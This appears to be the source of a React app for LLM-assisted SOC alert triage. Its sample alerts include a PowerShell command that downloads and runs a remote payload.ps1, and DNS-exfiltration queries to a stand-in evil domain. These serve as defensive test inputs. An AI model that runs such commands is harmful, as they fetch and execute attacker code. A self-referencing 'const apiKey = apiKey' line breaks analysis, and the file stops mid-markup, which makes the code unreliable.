import { useState } from "react";

const SAMPLE_ALERTS = [
  {
    id: 1,
    label: "Brute Force SSH",
    type: "Syslog",
    raw: `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:19 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:21 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:23 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:25 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:27 prod-server sshd[2341]: Failed password for admin from 185.220.101.45 port 52341 ssh2`
  },
  {
    id: 2,
    label: "Suspicious PowerShell",
    type: "Windows Event",
    raw: `EventID: 4104
TimeCreated: 2024-01-15T14:23:11Z
Computer: DESKTOP-A7K2P
User: CORP\\jsmith
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.200/payload.ps1')
CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand`
  },
  {
    id: 3,
    label: "DNS Exfiltration",
    type: "DNS Log",
    raw: `Timestamp: 2024-01-15T22:11:04Z
Source: 10.0.0.45
Query: aGVsbG93b3JsZA==.exfil.evilsite.xyz
Query: dGhpcyBpcyBhIHRlc3Q=.exfil.evilsite.xyz
Query: c2Vuc2l0aXZlZGF0YQ==.exfil.evilsite.xyz
Bytes_out: 48291
Unusual_subdomain_entropy: HIGH`
  },
  {
    id: 4,
    label: "Zeek C2 Beacon",
    type: "Zeek/Bro",
    raw: `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1705276800.123456 CRBfPk1234abcd 10.0.0.55 49201 203.0.113.99 4444 tcp - 3600.00 2457600 1024 SF
1705276801.234567 CRBfPk5678efgh 10.0.0.55 49202 203.0.113.99 4444 tcp - 3601.00 2457700 1025 SF`
  },
  {
    id: 5,
    label: "Cobalt Strike IDS",
    type: "Suricata",
    raw: `{
  "timestamp": "2024-01-15T10:33:21.123456+0000",
  "event_type": "alert",
  "src_ip": "10.0.0.22",
  "src_port": 54321,
  "dest_ip": "198.51.100.45",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2019401,
    "rev": 4,
    "signature": "ET MALWARE Possible Cobalt Strike Beacon Activity",
    "category": "Malware Command and Control Activity Detected",
    "severity": 1
  }
}`
  },
  {
    id: 6,
    label: "Firewall Block CEF",
    type: "CEF",
    raw: `CEF:0|Palo Alto Networks|PAN-OS|10.1|threat|THREAT|7|src=172.16.0.5 dst=203.0.113.10 spt=12345 dpt=80 proto=TCP act=block cs1=Mimikatz cs1Label=ThreatName deviceAction=block msg=Credential dumping tool detected rt=Jan 15 2024 08:22:11`
  }
];

const FORMAT_GUIDE = [
  {
    name: "Syslog",
    pattern: "<Month> <Day> <Time> <host> <process>[<pid>]: <message>",
    example: "Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2",
    tips: "Standard Linux/Unix log format. Include multiple lines if they share a source IP or pattern. The more lines you include, the better the pattern detection."
  },
  {
    name: "Windows Event",
    pattern: "EventID: <id>\nTimeCreated: <ISO8601>\nComputer: <host>\nUser: <domain\\user>\n...",
    example: "EventID: 4625\nTimeCreated: 2024-01-15T14:23:11Z\nComputer: DESKTOP-A7K2P\nAccount: CORP\\jsmith\nLogonType: 3",
    tips: "Export from Event Viewer as text or copy from SIEM. EventID is required. Include LogonType for authentication events."
  },
  {
    name: "Suricata / IDS",
    pattern: "JSON eve.log output or alert signature lines",
    example: '{"timestamp":"2024-01-15T10:33:21Z","event_type":"alert","src_ip":"10.0.0.22","dest_ip":"198.51.100.45","alert":{"signature":"ET MALWARE Cobalt Strike"}}',
    tips: "Paste the full JSON block from eve.log, or the raw alert line with signature name, src/dst IPs and ports."
  },
  {
    name: "Zeek / Bro",
    pattern: "TSV log with #fields header or conn.log / dns.log / http.log rows",
    example: "#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto duration orig_bytes\n1705276800.12 Cabc123 10.0.0.5 49201 203.0.113.9 4444 tcp 3600 2457600",
    tips: "Include the #fields header line so column order is clear. conn.log, dns.log, and http.log all work."
  },
  {
    name: "CEF",
    pattern: "CEF:<ver>|<vendor>|<product>|<ver>|<sig>|<name>|<severity>|<extensions>",
    example: "CEF:0|Palo Alto|PAN-OS|10.1|threat|THREAT|7|src=10.0.0.1 dst=1.2.3.4 act=block msg=Mimikatz detected",
    tips: "Used by Palo Alto, ArcSight, and many SIEMs. Include full CEF line with extension fields for best results."
  },
  {
    name: "Splunk / SIEM Export",
    pattern: "Key: Value pairs or raw search result rows",
    example: "index=main sourcetype=sysmon EventCode=1\nImage=C:\\Windows\\System32\\cmd.exe\nCommandLine=cmd.exe /c whoami\nParentImage=explorer.exe",
    tips: "Copy raw event text from Splunk, QRadar, Elastic, etc. Include field names — more context gives better analysis."
  },
  {
    name: "Free-form",
    pattern: "Plain English description with technical indicators included",
    example: "User jsmith logged in from 185.220.101.45 at 3am, ran whoami and net user /domain, then accessed \\\\DC01\\SYSVOL and downloaded ~500MB.",
    tips: "Works but produces lower confidence. Always include IPs, usernames, hostnames, commands, and timestamps when describing an incident."
  }
];

const VALIDATION_RULES = [
  {
    id: "too_short",
    test: (v) => v.trim().length < 25,
    message: "Input is too short to analyze.",
    detail: "Paste at least one full log line or alert. A single word, filename, or partial snippet doesn't contain enough context for triage."
  },
  {
    id: "url_only",
    test: (v) => /^https?:\/\/\S+$/.test(v.trim()),
    message: "A URL alone cannot be analyzed.",
    detail: "Paste the actual log data or alert text — not a link to it. If your SIEM shows a URL for the alert, open it and copy the raw event text from inside."
  },
  {
    id: "base64_only",
    test: (v) => {
      const t = v.trim().replace(/\s/g, "");
      return t.length > 80 && /^[A-Za-z0-9+/]+=*$/.test(t) && t.length % 4 === 0;
    },
    message: "This looks like raw Base64-encoded data with no surrounding context.",
    detail: "If this is an encoded command from a log entry, paste the full log line that contains it — not just the encoded value. If you need to decode it first, do that and then paste the decoded content along with the original log line."
  },
  {
    id: "no_context",
    test: (v) => {
      const t = v.trim();
      const hasIndicator = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|EventID|sshd|powershell|CEF:|alert|signature|Failed|blocked|denied|src=|dst=|uid\b|\.exe|\.ps1|\.sh|action|severity|category|timestamp|proto)/i.test(t);
      return t.split(/\s+/).length < 6 && !hasIndicator;
    },
    message: "Not enough technical context to triage.",
    detail: "The input needs at least a timestamp, source or destination, and an event description. Even a single complete syslog line works — make sure you're pasting the full line, not a fragment."
  }
];

const SEVERITY_CONFIG = {
  CRITICAL: { color: "#ff2d55", bg: "rgba(255,45,85,0.12)", label: "CRITICAL" },
  HIGH:     { color: "#ff9f0a", bg: "rgba(255,159,10,0.12)", label: "HIGH" },
  MEDIUM:   { color: "#ffd60a", bg: "rgba(255,214,10,0.10)", label: "MEDIUM" },
  LOW:      { color: "#30d158", bg: "rgba(48,209,88,0.10)",  label: "LOW" },
  INFORMATIONAL: { color: "#64d2ff", bg: "rgba(100,210,255,0.10)", label: "INFO" }
};

function ScanlineOverlay() {
  return (
    <div style={{
      position: "fixed", inset: 0, pointerEvents: "none", zIndex: 9999,
      background: "repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px)"
    }} />
  );
}

function TerminalCursor() {
  return (
    <span style={{
      display: "inline-block", width: 8, height: "1em",
      background: "#00ff88", marginLeft: 2, verticalAlign: "middle",
      animation: "blink 1s step-end infinite"
    }} />
  );
}

function FormatGuide({ open, onToggle }) {
  const [active, setActive] = useState(0);
  const f = FORMAT_GUIDE[active];
  return (
    <div style={{ marginBottom: 24, border: "1px solid #1a2e24", background: "#0a1410" }}>
      <button onClick={onToggle} style={{
        width: "100%", background: "transparent", border: "none", cursor: "pointer",
        display: "flex", alignItems: "center", justifyContent: "space-between",
        padding: "12px 16px", fontFamily: "inherit", color: "#5a8a6a"
      }}>
        <span style={{ fontSize: 10, letterSpacing: 2 }}>// INPUT FORMAT GUIDE — ACCEPTED LOG TYPES & EXAMPLES</span>
        <span style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 1 }}>{open ? "▲ COLLAPSE" : "▼ EXPAND"}</span>
      </button>
      {open && (
        <div style={{ padding: "0 16px 20px 16px", animation: "fadeIn 0.2s ease" }}>
          <p style={{ fontSize: 11, color: "#5a8a6a", lineHeight: 1.7, marginBottom: 16, marginTop: 4 }}>
            This tool accepts any standard security log format. Select a format below to see the expected pattern and a real example. If your log type isn't listed, try <strong style={{color:"#c9d8d3"}}>Free-form</strong> — include as many technical details as possible.
          </p>
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 16 }}>
            {FORMAT_GUIDE.map((fmt, i) => (
              <button key={i} onClick={() => setActive(i)} style={{
                background: active === i ? "rgba(0,255,136,0.08)" : "transparent",
                border: `1px solid ${active === i ? "#00ff88" : "#1a2e24"}`,
                color: active === i ? "#00ff88" : "#5a8a6a",
                padding: "4px 12px", fontSize: 10, cursor: "pointer",
                letterSpacing: 1, fontFamily: "inherit", transition: "all 0.15s"
              }}>{fmt.name}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 10 }}>
            <div>
              <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 5 }}>PATTERN</div>
              <div style={{ fontSize: 11, color: "#5a8a6a", background: "#080c0e", padding: "8px 12px", border: "1px solid #0f1e18", whiteSpace: "pre-wrap" }}>{f.pattern}</div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 5 }}>EXAMPLE</div>
              <div style={{ fontSize: 11, color: "#c9d8d3", background: "#080c0e", padding: "8px 12px", border: "1px solid #0f1e18", whiteSpace: "pre-wrap", lineHeight: 1.7 }}>{f.example}</div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 5 }}>TIPS</div>
              <div style={{ fontSize: 11, color: "#5a8a6a", lineHeight: 1.7 }}>ℹ {f.tips}</div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function ValidationErrors({ issues }) {
  return (
    <div style={{ border: "1px solid #ff9f0a", background: "rgba(255,159,10,0.05)", padding: 16, marginBottom: 20, animation: "fadeIn 0.2s ease" }}>
      <div style={{ fontSize: 10, color: "#ff9f0a", letterSpacing: 2, marginBottom: 12 }}>⚠ INPUT ISSUES DETECTED — CANNOT ANALYZE</div>
      {issues.map((issue, i) => (
        <div key={i} style={{ marginBottom: i < issues.length - 1 ? 14 : 0 }}>
          <div style={{ fontSize: 12, color: "#ff9f0a", marginBottom: 5 }}>✗ {issue.message}</div>
          <div style={{ fontSize: 11, color: "#7a8a80", lineHeight: 1.7, paddingLeft: 12, borderLeft: "2px solid #2a1a08" }}>{issue.detail}</div>
        </div>
      ))}
      <div style={{ marginTop: 14, paddingTop: 12, borderTop: "1px solid #1a1208", fontSize: 10, color: "#3a5a48" }}>
        → Expand the <span style={{ color: "#5a8a6a" }}>FORMAT GUIDE</span> above to see accepted formats and examples.
      </div>
    </div>
  );
}

function InputDiagnosis({ diagnosis }) {
  return (
    <div style={{ border: "1px solid #ff2d5566", background: "rgba(255,45,85,0.05)", padding: 20, marginBottom: 24, animation: "fadeIn 0.2s ease" }}>
      <div style={{ fontSize: 10, color: "#ff2d55", letterSpacing: 2, marginBottom: 12 }}>✗ ANALYSIS FAILED — AI INPUT DIAGNOSIS</div>
      <div style={{ fontSize: 12, color: "#c9d8d3", lineHeight: 1.8, marginBottom: 16 }}>{diagnosis.problem}</div>
      {diagnosis.suggestions?.length > 0 && (
        <div style={{ marginBottom: diagnosis.example ? 16 : 0 }}>
          <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 8 }}>HOW TO FIX</div>
          {diagnosis.suggestions.map((s, i) => (
            <div key={i} style={{ fontSize: 11, color: "#5a8a6a", lineHeight: 1.7, paddingLeft: 12, marginBottom: 4, borderLeft: "2px solid #1a2e24" }}>→ {s}</div>
          ))}
        </div>
      )}
      {diagnosis.example && (
        <div>
          <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 6 }}>SUGGESTED FORMAT</div>
          <div style={{ fontSize: 11, color: "#c9d8d3", background: "#080c0e", padding: "10px 12px", border: "1px solid #1a2e24", whiteSpace: "pre-wrap", lineHeight: 1.7 }}>{diagnosis.example}</div>
        </div>
      )}
    </div>
  );
}

export default function SOCTriageTool() {
  const [input, setInput]               = useState("");
  const [result, setResult]             = useState(null);
  const [loading, setLoading]           = useState(false);
  const [loadingStage, setLoadingStage] = useState("");
  const [validationIssues, setValidationIssues] = useState([]);
  const [diagnosis, setDiagnosis]       = useState(null);
  const [history, setHistory]           = useState([]);
  const [guideOpen, setGuideOpen]       = useState(false);
  const [apiKey, setApiKey]             = useState(() => localStorage.getItem("groq_api_key") || "");
  const [keyEntry, setKeyEntry]         = useState("");
  const [showKeySetup, setShowKeySetup] = useState(false);

  function saveKey() {
    const k = keyEntry.trim();
    if (!k) return;
    localStorage.setItem("groq_api_key", k);
    setApiKey(k);
    setKeyEntry("");
    setShowKeySetup(false);
  }

  function clearKey() {
    localStorage.removeItem("groq_api_key");
    setApiKey("");
    setShowKeySetup(true);
  }

  function handleInputChange(e) {
    setInput(e.target.value);
    if (validationIssues.length > 0) setValidationIssues([]);
    if (diagnosis) setDiagnosis(null);
    if (result) setResult(null);
  }

  async function diagnoseBadInput(rawInput, errMsg) {
    const prompt = `You are a SOC analyst and log format expert. A user submitted input to a security alert triage tool, but analysis failed.

User input:
"""
${rawInput.slice(0, 800)}
"""

Error: ${errMsg}

Diagnose what is wrong and give specific actionable guidance. Respond ONLY with valid JSON — no markdown, no backticks:
{
  "problem": "1-2 sentence explanation of what is wrong with this input",
  "suggestions": ["fix 1", "fix 2", "fix 3"],
  "example": "short corrected example showing what this input should look like (empty string if not applicable)"
}`;

    try {
      const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apiKey}`
        },
        body: JSON.stringify({
          model: "llama-3.3-70b-versatile",
          max_tokens: 500,
          temperature: 0.2,
          messages: [{ role: "user", content: prompt }]
        })
      });
      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(`API error ${res.status}: ${errData.error?.message || res.statusText}`);
      }
      const data = await res.json();
      const text = data.choices?.[0]?.message?.content || "";
      if (!text) throw new Error("Empty response from model");
      return JSON.parse(text.replace(/```json|```/g, "").trim());
    } catch (err) {
      console.error("[SOC Triage] diagnoseBadInput error:", err);
      return {
        problem: `Analysis failed: ${err.message}`,
        suggestions: [
          "Check that your Groq API key is correct — click the key icon in the header to update it.",
          "Get a free key at console.groq.com → API Keys.",
          "Open DevTools → Console for the full error details."
        ],
        example: ""
      };
    }
  }

  async function analyzeAlert() {
    const issues = VALIDATION_RULES.filter(r => r.test(input));
    if (issues.length > 0) {
      setValidationIssues(issues);
      return;
    }

    setLoading(true);
    setValidationIssues([]);
    setDiagnosis(null);
    setResult(null);

    const prompt = `You are a senior SOC analyst. Analyze the following security log, SIEM alert, IDS event, or network log and return a structured triage assessment.

You will accept any format: syslog, Windows Event Log, Zeek/Bro, Suricata JSON, CEF, Splunk export, firewall log, or free-form incident narrative. Identify the format automatically and extract all relevant fields.

If the input is ambiguous or missing some fields, make your best assessment and reflect uncertainty with a lower confidence score and honest analyst_notes.

Respond ONLY with a valid JSON object — no markdown, no backticks, no preamble:
{
  "severity": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFORMATIONAL",
  "log_format_detected": "e.g. Syslog, Windows Event Log, Suricata JSON, Zeek conn.log, CEF, Free-form Narrative, Unknown",
  "summary": "2-3 sentences: what happened, why it is suspicious, what the attacker may be attempting",
  "threat_type": "short label e.g. Brute Force, Lateral Movement, C2 Beacon, Data Exfiltration, Privilege Escalation",
  "mitre_tactic": "MITRE ATT&CK tactic name",
  "mitre_technique": "Technique ID and name e.g. T1110.001 - Password Spraying",
  "iocs": ["IPs", "domains", "hashes", "usernames", "commands", "filenames extracted from the input"],
  "recommended_action": "Specific next step for the on-call analyst",
  "false_positive_likelihood": "Low" | "Medium" | "High",
  "confidence": 0-100,
  "analyst_notes": "Any caveats about missing fields, assumptions made, or suggestions to improve the input quality"
}

Log/Alert Input:
${input}`;

    try {
      const apiKey = apiKey;
      if (!apiKey) throw new Error("No API key set — enter your Groq API key using the key icon in the header.");

      setLoadingStage("Detecting log format...");
      await new Promise(r => setTimeout(r, 350));
      setLoadingStage("Running triage analysis...");

      const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${apiKey}`
        },
        body: JSON.stringify({
          model: "llama-3.3-70b-versatile",
          max_tokens: 1000,
          temperature: 0.2,
          messages: [{ role: "user", content: prompt }]
        })
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(`API error ${res.status}: ${errData.error?.message || res.statusText}`);
      }

      const data = await res.json();
      const text = data.choices?.[0]?.message?.content || "";
      if (!text) throw new Error("Empty API response");

      let parsed;
      try {
        parsed = JSON.parse(text.replace(/```json|```/g, "").trim());
      } catch (parseErr) {
        setLoadingStage("Diagnosing input...");
        setDiagnosis(await diagnoseBadInput(input, parseErr.message));
        return;
      }

      setResult(parsed);
      setHistory(h => [{
        input: input.slice(0, 60) + (input.length > 60 ? "..." : ""),
        result: parsed,
        ts: new Date().toLocaleTimeString()
      }, ...h.slice(0, 4)]);

    } catch (e) {
      console.error("[SOC Triage] analyzeAlert error:", e);
      setDiagnosis({
        problem: `Analysis error: ${e.message}`,
        suggestions: [
          "Check that your Groq API key is correct — click the key icon in the header to update it.",
          "Get a free key at console.groq.com → API Keys.",
          "Open DevTools → Console for the full error details."
        ],
        example: ""
      });
    } finally {
      setLoading(false);
      setLoadingStage("");
    }
  }

  function loadSample(s) {
    setInput(s.raw);
    setResult(null);
    setDiagnosis(null);
    setValidationIssues([]);
  }

  function exportReport() {
    if (!result) return;
    const ts = new Date().toISOString();
    const lines = [
      "SOC TRIAGE REPORT",
      `Generated: ${ts}`,
      "=".repeat(60),
      "",
      `SEVERITY:              ${result.severity}`,
      `THREAT TYPE:           ${result.threat_type}`,
      `LOG FORMAT DETECTED:   ${result.log_format_detected || "Unknown"}`,
      `CONFIDENCE:            ${result.confidence}%`,
      `FALSE POSITIVE RISK:   ${result.false_positive_likelihood}`,
      "",
      "MITRE ATT&CK",
      `  Tactic:    ${result.mitre_tactic}`,
      `  Technique: ${result.mitre_technique}`,
      "",
      "SUMMARY",
      result.summary,
      "",
      "INDICATORS OF COMPROMISE",
      ...(result.iocs || []).map(ioc => `  - ${ioc}`),
      "",
      "RECOMMENDED ACTION",
      `  ${result.recommended_action}`,
      "",
      ...(result.analyst_notes ? ["ANALYST NOTES", `  ${result.analyst_notes}`, ""] : []),
      "=".repeat(60),
      "RAW ALERT INPUT",
      input
    ];
    const blob = new Blob([lines.join("\n")], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `triage-report-${ts.slice(0, 19).replace(/[:.]/g, "-")}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  }

  const sev = result ? SEVERITY_CONFIG[result.severity] || SEVERITY_CONFIG.INFORMATIONAL : null;
  const inputTooShort = input.length > 0 && input.trim().length < 25;

  return (
    <div style={{
      minHeight: "100vh",
      background: "#080c0e",
      fontFamily: "'JetBrains Mono','Fira Code','Courier New',monospace",
      color: "#c9d8d3",
      padding: "0 0 60px 0"
    }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap');
        @keyframes blink  { 0%,100%{opacity:1} 50%{opacity:0} }
        @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
        @keyframes pulse  { 0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,0.4)} 50%{box-shadow:0 0 0 8px rgba(0,255,136,0)} }
        .analyze-btn:hover:not(:disabled){ background:#00ff88 !important; color:#080c0e !important; }
        .sample-btn:hover { border-color:#00ff88 !important; color:#00ff88 !important; }
        .export-btn:hover { border-color:#00ff88 !important; color:#00ff88 !important; }
        .triage-result { animation: fadeIn 0.4s ease; }
        textarea { resize:vertical; }
        textarea:focus { outline:none; border-color:#00ff88 !important; box-shadow:0 0 0 1px #00ff88, 0 0 20px rgba(0,255,136,0.08) !important; }
        ::-webkit-scrollbar{width:4px} ::-webkit-scrollbar-track{background:#0d1517} ::-webkit-scrollbar-thumb{background:#1e3028;border-radius:2px}
        .ioc-tag:hover { background:rgba(0,255,136,0.15) !important; }
      `}</style>

      <ScanlineOverlay />

      {/* Header */}
      <div style={{ borderBottom:"1px solid #1a2e24", padding:"24px 32px", display:"flex", alignItems:"center", gap:16, background:"rgba(0,255,136,0.02)" }}>
        <div style={{ width:10, height:10, borderRadius:"50%", background: apiKey ? "#00ff88" : "#ff9f0a", animation:"pulse 2s infinite" }} />
        <div>
          <div style={{ fontFamily:"'Orbitron',monospace", fontSize:13, fontWeight:700, letterSpacing:4, color:"#00ff88" }}>SOC TRIAGE</div>
          <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginTop:1 }}>AI-POWERED ALERT ANALYSIS SYSTEM v2.0</div>
        </div>
        <div style={{ marginLeft:"auto", display:"flex", alignItems:"center", gap:16 }}>
          <button
            onClick={() => setShowKeySetup(s => !s)}
            title={apiKey ? "API key set — click to change" : "No API key — click to set"}
            style={{
              background:"transparent", border:`1px solid ${apiKey ? "#1a2e24" : "#ff9f0a"}`,
              color: apiKey ? "#3a5a48" : "#ff9f0a", padding:"4px 10px", fontSize:10,
              cursor:"pointer", letterSpacing:1, fontFamily:"inherit", transition:"all 0.15s"
            }}
          >
            {apiKey ? "⚿ KEY SET" : "⚿ SET API KEY"}
          </button>
          <span style={{ fontSize:10, color:"#3a5a48", letterSpacing:1 }}>
            {new Date().toISOString().slice(0,19).replace("T"," ")} UTC
          </span>
        </div>
      </div>

      {/* API Key Setup Panel */}
      {(!apiKey || showKeySetup) && (
        <div style={{ background:"#0a1208", borderBottom:"1px solid #1a2e24", padding:"16px 32px", animation:"fadeIn 0.2s ease" }}>
          <div style={{ maxWidth:960, margin:"0 auto", display:"flex", alignItems:"center", gap:12, flexWrap:"wrap" }}>
            <div style={{ fontSize:10, color: apiKey ? "#3a5a48" : "#ff9f0a", letterSpacing:2, flexShrink:0 }}>
              {apiKey ? "// UPDATE GROQ API KEY" : "// GROQ API KEY REQUIRED"}
            </div>
            <input
              type="password"
              value={keyEntry}
              onChange={e => setKeyEntry(e.target.value)}
              onKeyDown={e => e.key === "Enter" && saveKey()}
              placeholder="gsk_..."
              style={{
                flex:1, minWidth:260, background:"#0d1517", border:"1px solid #1a2e24",
                color:"#c9d8d3", padding:"6px 12px", fontSize:11, fontFamily:"inherit",
                outline:"none"
              }}
            />
            <button onClick={saveKey} disabled={!keyEntry.trim()} style={{
              background:"transparent", border:"1px solid #00ff88", color:"#00ff88",
              padding:"6px 16px", fontSize:10, cursor: keyEntry.trim() ? "pointer" : "default",
              letterSpacing:2, fontFamily:"inherit", opacity: keyEntry.trim() ? 1 : 0.4
            }}>SAVE</button>
            {apiKey && (
              <button onClick={clearKey} style={{
                background:"transparent", border:"1px solid #2a1a08", color:"#5a4a38",
                padding:"6px 12px", fontSize:10, cursor:"pointer", letterSpacing:1, fontFamily:"inherit"
              }}>CLEAR</button>
            )}
            <span style={{ fontSize:10, color:"#3a5a48" }}>
              Free key at <span style={{ color:"#5a8a6a" }}>console.groq.com</span>
            </span>
          </div>
        </div>
      )}

      <div style={{ maxWidth:960, margin:"0 auto", padding:"32px 24px" }}>

        <FormatGuide open={guideOpen} onToggle={() => setGuideOpen(o => !o)} />

        {/* Samples */}
        <div style={{ marginBottom:20 }}>
          <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:10 }}>// SAMPLE ALERTS</div>
          <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
            {SAMPLE_ALERTS.map(s => (
              <button key={s.id} className="sample-btn" onClick={() => loadSample(s)} style={{
                background:"transparent", border:"1px solid #1a2e24", color:"#5a8a6a",
                padding:"5px 12px", fontSize:10, cursor:"pointer", letterSpacing:1,
                transition:"all 0.15s", fontFamily:"inherit"
              }}>
                <span style={{ color:"#3a5a48", fontSize:9 }}>[{s.type}]</span> {s.label}
              </button>
            ))}
          </div>
        </div>

        {/* Input */}
        <div style={{ marginBottom:8 }}>
          <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:8 }}>
            <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2 }}>// PASTE ALERT OR LOG SNIPPET</div>
            {input.length > 0 && (
              <span style={{ fontSize:10, color: inputTooShort ? "#ff9f0a" : "#3a5a48" }}>
                {input.length} chars
              </span>
            )}
          </div>
          <textarea
            value={input}
            onChange={handleInputChange}
            placeholder={"Paste any log format here — syslog, Windows Event, Suricata, Zeek, CEF, Splunk, or free-form narrative.\n\nNot sure how to format your input? Expand the Format Guide above."}
            rows={9}
            style={{
              width:"100%", boxSizing:"border-box",
              background:"#0d1517",
              border:`1px solid ${validationIssues.length > 0 ? "#ff9f0a" : "#1a2e24"}`,
              color:"#c9d8d3", padding:"16px", fontSize:12,
              lineHeight:1.7, fontFamily:"inherit",
              transition:"border-color 0.2s, box-shadow 0.2s"
            }}
          />
        </div>

        {inputTooShort && (
          <div style={{ fontSize:10, color:"#ff9f0a", marginBottom:10, letterSpacing:1 }}>
            ⚠ Input too short — paste a complete log line or alert
          </div>
        )}

        {validationIssues.length > 0 && <ValidationErrors issues={validationIssues} />}

        <button
          className="analyze-btn"
          onClick={analyzeAlert}
          disabled={loading || !input.trim()}
          style={{
            background: loading ? "#0d1517" : "transparent",
            border:`1px solid ${loading ? "#1a2e24" : "#00ff88"}`,
            color: loading ? "#3a5a48" : "#00ff88",
            padding:"12px 32px", fontSize:12,
            cursor: loading || !input.trim() ? "default" : "pointer",
            letterSpacing:3, fontFamily:"inherit", fontWeight:600,
            transition:"all 0.15s", width:"100%", marginBottom:28
          }}
        >
          {loading
            ? <span>{loadingStage || "ANALYZING"}<TerminalCursor /></span>
            : "→ ANALYZE ALERT"}
        </button>

        {diagnosis && <InputDiagnosis diagnosis={diagnosis} />}

        {/* Result */}
        {result && sev && (
          <div className="triage-result">

            {result.log_format_detected && (
              <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:8 }}>
                FORMAT DETECTED: <span style={{ color:"#5a8a6a" }}>{result.log_format_detected}</span>
              </div>
            )}

            <div style={{
              border:`1px solid ${sev.color}`, background:sev.bg,
              padding:"14px 20px", marginBottom:1,
              display:"flex", alignItems:"center", justifyContent:"space-between"
            }}>
              <div style={{ display:"flex", alignItems:"center", gap:12 }}>
                <div style={{ fontFamily:"'Orbitron',monospace", fontSize:18, fontWeight:900, color:sev.color, letterSpacing:3 }}>
                  {sev.label}
                </div>
                <div style={{ fontSize:11, color:sev.color, opacity:0.7 }}>{result.threat_type}</div>
              </div>
              <div style={{ fontSize:11, color:"#5a8a6a" }}>
                CONFIDENCE: <span style={{ color: result.confidence >= 70 ? "#c9d8d3" : "#ff9f0a" }}>{result.confidence}%</span>
              </div>
            </div>

            {result.confidence < 60 && (
              <div style={{ background:"rgba(255,159,10,0.05)", border:"1px solid rgba(255,159,10,0.25)", borderTop:"none", padding:"8px 20px", marginBottom:1 }}>
                <span style={{ fontSize:10, color:"#ff9f0a", letterSpacing:1 }}>⚠ LOW CONFIDENCE — </span>
                <span style={{ fontSize:10, color:"#7a8a80" }}>Add timestamps, IPs, or more event context to improve accuracy.</span>
              </div>
            )}

            <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:1, marginBottom:1 }}>

              <div style={{ gridColumn:"1 / -1", background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:8 }}>// SUMMARY</div>
                <div style={{ fontSize:13, lineHeight:1.8, color:"#c9d8d3" }}>{result.summary}</div>
              </div>

              <div style={{ background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// MITRE ATT&CK</div>
                <div style={{ fontSize:11, color:"#5a8a6a", marginBottom:4 }}>TACTIC</div>
                <div style={{ fontSize:13, color:"#c9d8d3", marginBottom:12 }}>{result.mitre_tactic}</div>
                <div style={{ fontSize:11, color:"#5a8a6a", marginBottom:4 }}>TECHNIQUE</div>
                <div style={{ fontSize:13, color:"#00ff88" }}>{result.mitre_technique}</div>
              </div>

              <div style={{ background:"#0d1517", border:"1px solid #1a2e24", padding:20 }}>
                <div style={{ fontSize:10, color:"#3a5a48", letterSpacing:2, marginBottom:12 }}>// ASSESSMENT</div>
                <div style={{ fontSize:11, color:"#5a8a6a", marginBottom:4 }}>FALSE POSITIVE LIKELIHOOD</div>
                <div style={{ fontSize:20, fontFamily:"'Orbitron',monospace", fontWeight:700,
                  color: result.false_positive_likelihood === "Low" ? "#30d158" : result.false_positive_likelihood === "High" ? "#ff9f0a" : "#ffd60a" }}>
                  {result.false_positive_likelihood?.toUpperCase()}
